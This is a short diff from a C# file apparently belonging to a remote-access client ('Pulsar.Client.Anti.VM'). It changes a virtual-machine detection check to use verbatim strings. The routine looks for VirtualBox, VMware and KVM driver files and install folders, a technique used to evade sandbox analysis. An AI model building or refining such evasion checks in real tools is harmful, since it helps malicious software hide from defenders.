@@ -161,7 +161,7 @@ namespace Pulsar.Client.Anti.VM
             try
             {
                 string[] badFiles = { "balloon.sys", "VBoxMouse.sys", "netkvm.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys"};
-                string[] badDirs = { "C:\Program Files\VMware", "C:\Program Files\Oracle\VirtualBox Guest Additions" };
+                string[] badDirs = { @"C:\Program Files\VMware", @"C:\Program Files\Oracle\VirtualBox Guest Additions" };
                 string driversPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers");
         
                 foreach (string file in Directory.GetFiles(driversPath))
